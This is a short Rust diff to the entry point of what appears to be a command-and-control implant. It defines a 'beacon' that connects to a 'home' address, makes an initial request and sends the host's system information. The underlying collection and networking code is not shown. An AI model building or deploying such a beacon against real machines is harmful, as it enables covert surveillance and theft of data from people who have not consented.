@@ -1,16 +1,18 @@
 mod beacon;
 mod collector;
 
-use windows::core::HSTRING;
+use std::net::SocketAddrV4;
 
 #[cfg(feature = "logging")]
 pub fn init_logging() {
     simple_logger::init().unwrap();
 }
 
-pub fn run(hostname: HSTRING, port: u16) -> windows::core::Result<()> {
-    let mut beacon = beacon::Beacon::new()?;
-    beacon.init_conn(hostname, port)?;
+pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
+    let mut beacon = beacon::Beacon::new(home)?;
+    beacon.initial_request()?;
+
+    beacon.send_system_info()?;
 
     Ok(())
 }
